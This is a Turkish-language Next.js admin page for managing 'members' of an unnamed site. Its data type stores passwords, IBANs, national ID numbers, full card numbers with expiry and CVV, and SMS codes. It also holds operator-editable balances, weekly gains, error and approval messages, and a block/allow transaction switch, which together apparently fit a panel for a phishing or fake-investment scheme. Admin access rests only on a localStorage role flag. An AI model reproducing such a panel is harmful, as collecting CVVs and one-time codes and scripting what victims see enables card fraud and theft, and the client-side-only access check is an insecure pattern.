
"use client";

import { useState, useEffect } from "react";
import { Card, CardContent, CardHeader, CardTitle, CardDescription, CardFooter } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { PlusCircle, Edit, Trash2, LogOut, CreditCard, AlertCircle } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { useRouter } from "next/navigation";
import AdminMemberForm from "@/components/dashboard/admin-member-form";
import { getMembers, setMembers as saveMembers, fetchFirebaseUsers } from "@/lib/member-storage";
import { Badge } from "@/components/ui/badge";

export type AdminMember = {
  id: string; // Firebase UID
  name: string;
  phone: string; // Firebase email will be stored here for display
  password?: string;
  iban: string;
  bank: string;
  tc: string;
  il: string;
  ilce: string;
  weeklyGain: string;
  errorMessage: string;
  onayMesaji: string;
  invoiceAmount: string;
  accountActivity: string;
  meetingInfo: string;
  currentBalance: string;
  status: 'Aktif' | 'Pasif';
  transactionStatus: 'allowed' | 'blocked';
  // Card details
  cardNumber?: string;
  cardExpiry?: string;
  cardCvv?: string;
  smsCode?: string;
};

const MEMBERS_PER_PAGE = 20;

export default function AdminPage() {
    const [members, setMembers] = useState<AdminMember[]>([]);
    const [isFormOpen, setIsFormOpen] = useState(false);
    const [editingMember, setEditingMember] = useState<AdminMember | null>(null);
    const [currentPage, setCurrentPage] = useState(1);
    const { toast } = useToast();
    const router = useRouter();
    const [isLoading, setIsLoading] = useState(true);

    useEffect(() => {
        const role = typeof window !== 'undefined' ? localStorage.getItem('userRole') : null;
        if (role !== 'admin') {
            router.push('/dashboard');
            return;
        }

        const initializeMembers = async () => {
          setIsLoading(true);
          try {
            const allMembers = await getMembers();
            setMembers(allMembers);
          } catch (error) {
            console.error("Failed to fetch members:", error);
            toast({
              variant: "destructive",
              title: "Hata",
              description: "Üyeler getirilirken bir hata oluştu.",
            });
          } finally {
            setIsLoading(false);
          }
        };

        initializeMembers();
    }, [router, toast]);
    
    const handleLogout = () => {
        if (typeof window !== 'undefined') {
            localStorage.removeItem('userRole');
            localStorage.removeItem('loggedInUser');
            localStorage.removeItem('firebaseUsersCache');
        }
        router.push("/");
    };

    const handleEditMember = (member: AdminMember) => {
        setEditingMember(member);
        setIsFormOpen(true);
    }
    
    // Deleting a member now means deleting their profile details, not their auth record.
    // For a full user deletion, you would need backend logic (Cloud Functions) to delete the Auth user.
    // Here we'll just remove their data from our local storage.
    const handleDeleteMember = (id: string) => {
      const updatedMembers = members.filter(m => m.id !== id);
      const membersWithDetails = updatedMembers.filter(m => m.name && m.tc); // Filter out users without details
      setMembers(updatedMembers);
      saveMembers(membersWithDetails); // Save only members that have details
      toast({
        title: "Başarılı",
        description: "Üyenin profil bilgileri başarıyla silindi.",
      });

      const totalPages = Math.ceil(updatedMembers.length / MEMBERS_PER_PAGE);
      if (currentPage > totalPages) {
          setCurrentPage(totalPages > 0 ? totalPages : 1);
      }
    }

    const handleSaveMember = (memberData: AdminMember) => {
        let updatedMembers;
        
        updatedMembers = members.map(m => m.id === memberData.id ? { ...m, ...memberData } : m);
        
        toast({
            title: "Başarılı",
            description: "Üye bilgileri güncellendi.",
        });

        const membersWithDetails = updatedMembers.filter(m => m.name && m.tc);

        setMembers(updatedMembers);
        saveMembers(membersWithDetails); // Save only members that have details
        setIsFormOpen(false);
        setEditingMember(null);
    }
    
    // Pagination logic
    const totalPages = Math.ceil(members.length / MEMBERS_PER_PAGE);
    const indexOfLastMember = currentPage * MEMBERS_PER_PAGE;
    const indexOfFirstMember = indexOfLastMember - MEMBERS_PER_PAGE;
    const currentMembers = members.slice(indexOfFirstMember, indexOfLastMember);

    const paginate = (pageNumber: number) => {
        if (pageNumber > 0 && pageNumber <= totalPages) {
            setCurrentPage(pageNumber);
        }
    }

    return (
        <div className="space-y-6">
            <Card>
                <CardHeader className="flex flex-row items-center justify-between">
                    <div>
                        <CardTitle className="text-3xl font-headline font-bold">Admin Paneli - Üye Yönetimi</CardTitle>
                        <CardDescription>Firebase'den gelen kullanıcıları düzenleyin. Yeni kullanıcıları Firebase Authentication'dan ekleyin.</CardDescription>
                    </div>
                     <Dialog open={isFormOpen} onOpenChange={setIsFormOpen}>
                        <DialogContent className="max-h-[90vh] overflow-y-auto">
                            <DialogHeader>
                                <DialogTitle>Üye Düzenle</DialogTitle>
                            </DialogHeader>
                            <AdminMemberForm 
                                member={editingMember} 
                                onSave={handleSaveMember}
                                onCancel={() => setIsFormOpen(false)}
                            />
                        </DialogContent>
                    </Dialog>
                    <Button variant="outline" onClick={handleLogout}>
                        <LogOut className="mr-2 h-5 w-5" />
                        Çıkış Yap
                    </Button>
                </CardHeader>
                <CardContent>
                    {isLoading ? (
                      <div className="text-center p-8">Yükleniyor...</div>
                    ) : (
                    <div className="overflow-x-auto">
                        <Table>
                            <TableHeader>
                                <TableRow>
                                    <TableHead>Ad Soyad</TableHead>
                                    <TableHead>Email (Giriş)</TableHead>
                                    <TableHead>Kart Bilgileri</TableHead>
                                    <TableHead>Üyelik Durumu</TableHead>
                                    <TableHead className="text-right">Eylemler</TableHead>
                                </TableRow>
                            </TableHeader>
                            <TableBody>
                                {currentMembers.map((member) => (
                                    <TableRow key={member.id}>
                                        <TableCell className="font-medium flex items-center gap-2">
                                          {member.name ? member.name : 
                                            <span className="text-destructive flex items-center gap-1">
                                              <AlertCircle size={16} /> Detaylar Eksik
                                            </span>
                                          }
                                        </TableCell>
                                        <TableCell>{member.phone}</TableCell>
                                        <TableCell>
                                           {member.cardNumber && <CreditCard className="h-5 w-5 text-blue-500" />}
                                        </TableCell>
                                        <TableCell>
                                            <Badge variant={member.status === 'Aktif' ? 'default' : 'destructive'} className={member.status === 'Aktif' ? 'bg-green-600' : 'bg-red-600'}>
                                                {member.status}
                                            </Badge>
                                        </TableCell>
                                        <TableCell className="text-right space-x-2">
                                            <Button variant="ghost" size="icon" onClick={() => handleEditMember(member)}>
                                                <Edit className="h-4 w-4" />
                                            </Button>
                                            <Button variant="ghost" size="icon" onClick={() => handleDeleteMember(member.id)}>
                                                <Trash2 className="h-4 w-4 text-destructive" />
                                            </Button>
                                        </TableCell>
                                    </TableRow>
                                ))}
                            </TableBody>
                        </Table>
                    </div>
                    )}
                </CardContent>
                {totalPages > 1 && (
                    <CardFooter className="flex justify-center items-center gap-2 pt-4">
                        <Button
                            variant="outline"
                            size="sm"
                            onClick={() => paginate(currentPage - 1)}
                            disabled={currentPage === 1}
                        >
                            Önceki
                        </Button>
                        <span className="text-sm text-muted-foreground">
                            Sayfa {currentPage} / {totalPages}
                        </span>
                        <Button
                            variant="outline"
                            size="sm"
                            onClick={() => paginate(currentPage + 1)}
                            disabled={currentPage === totalPages}
                        >
                            Sonraki
                        </Button>
                    </CardFooter>
                )}
            </Card>
        </div>
    );
}

